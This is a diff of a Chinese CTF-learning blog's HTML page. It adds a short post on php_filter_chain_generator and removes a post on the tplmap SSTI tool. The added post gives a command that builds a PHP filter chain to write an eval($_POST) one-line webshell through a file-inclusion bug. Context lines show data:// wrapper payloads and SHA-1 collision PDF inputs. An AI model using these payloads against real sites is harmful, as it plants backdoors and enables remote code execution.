@@ -164,6 +164,102 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://muxiahuo.github.io/2024/07/14/php-filter-chain-generator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="muxiahuo">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一只鼍的博客 | Glory's blog">
+      <meta itemprop="description" content="做一只自由的鼍">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 一只鼍的博客 | Glory's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/07/14/php-filter-chain-generator/" class="post-title-link" itemprop="url">php_filter_chain_generator</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-07-14 16:53:15 / 修改时间：16:53:25" itemprop="dateCreated datePublished" datetime="2024-07-14T16:53:15+08:00">2024-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>197</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>&emsp;&emsp;文件包含漏洞利用流在其中写入一句话木马，脚本下载<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">here</a><br>&emsp;&emsp;常用的命令（当然也可以看那里的）  </p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">python3 php_filter_chain_generator.py --chain &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">6</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p> <img data-src="/images/php_filter.png" alt="php_filter"><br>&emsp;&emsp;将回显的链子复制给网页,然后用hackbar或者蚁剑连接即可。<br><img data-src="/images/php_filter2.png" alt="php_filter2"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://muxiahuo.github.io/2024/07/13/include-require/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -200,7 +296,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-07-14 16:48:07" itemprop="dateModified" datetime="2024-07-14T16:48:07+08:00">2024-07-14</time>
+      <time title="修改时间：2024-07-14 16:50:50" itemprop="dateModified" datetime="2024-07-14T16:50:50+08:00">2024-07-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -264,7 +360,7 @@
 
 <h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>&emsp;&emsp;当我们无法读取到有用信息或者不知道读取哪个php文件时，我们可以利用流写入一句话木马进去，详情请转到<a href="/2024/07/14/php-filter-chain-generator/">php_filter_chain_generator</a>脚本参考</p>
 <h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>&emsp;&emsp;可以访问请求的原始数据的只读流,<strong>将post请求的数据当作php代码执行</strong>,当传入的参数作为文件名打开时，可以<strong>将参数设为php:&#x2F;&#x2F;input</strong>,同时<strong>post写入想要执行的php代码</strong>，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p>
-<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain"></a>data:&#x2F;&#x2F;text&#x2F;plain</h4><p>&emsp;&emsp;在后面写入你想写入的数据给参数，例如<strong>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></strong>,如果对特殊字符进行了过滤，可以进行base64编码，**data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;**不常用，有这条件可以用php:&#x2F;&#x2F;input（doge）</p>
+<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain"></a>data:&#x2F;&#x2F;text&#x2F;plain</h4><p>&emsp;&emsp;在后面写入你想写入的数据给参数，例如<strong>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></strong>,如果对特殊字符进行了过滤，可以进行base64编码，_data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;_不常用，有这条件可以用php:&#x2F;&#x2F;input（doge）</p>
 <h3 id="唠会嗑"><a href="#唠会嗑" class="headerlink" title="唠会嗑"></a>唠会嗑</h3><p>&emsp;&emsp;剩下的伪协议不常见也不常考（至少我还没遇到( ͡°❥ ͡°)），能学到这已经很不错了，重点在于实操去做题，两个字：沉淀，这些知识点在网上有很多资料都可以查到，我写的很多都是网上照抄的（(ฅ•﹏•ฅ)），我写在blog里一来是为了引导学习路线，写的不详细或者看不懂的地方可以复制目录去搜索相关知识点，二来就是自己整理知识点，加强印象。希望各位师傅们能够在web道路上走得更快更远ヾ(❀╹◡╹)ﾉﾞ❀~</p>
 
       
@@ -1116,119 +1212,6 @@
 <p>&emsp;&emsp;遇到string的情况</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br><span class="line"></span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure>
 
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://muxiahuo.github.io/2024/06/06/tplmap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="muxiahuo">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="一只鼍的博客 | Glory's blog">
-      <meta itemprop="description" content="做一只自由的鼍">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 一只鼍的博客 | Glory's blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/06/06/tplmap/" class="post-title-link" itemprop="url">tplmap</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-06-06 19:52:22" itemprop="dateCreated datePublished" datetime="2024-06-06T19:52:22+08:00">2024-06-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-06-07 13:48:35" itemprop="dateModified" datetime="2024-06-07T13:48:35+08:00">2024-06-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B7%A5%E5%85%B7-%E8%84%9A%E6%9C%AC-%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具|脚本 利用</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>713</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
-<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在kali或者linux安装即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;进入该文件夹下安装依赖（就是安装库啦）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;如果安装报错了，不妨试一试pip2安装，别问我怎么知道的，我就是(ᇂ_ᇂ|||)</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt;?name=</span><br><span class="line">POST:</span><br><span class="line">python3 tplmap.py -u &lt;URL:&gt; --data= name=</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/tplmap.png" alt="tplmap"></p>
-<p>&emsp;&emsp;如上面所示，可以得出模板是jinja2，如果下面那一段显示yes或者ok，那么可以直接用shell指令（–os-shell）。</p>
-<p>&emsp;&emsp;更多用法可以用help查看，很多python脚本都可以这样做(不认识英文直接去找翻译(ง •̀_•́)ง加油)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tplmap.py --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
 
 
       
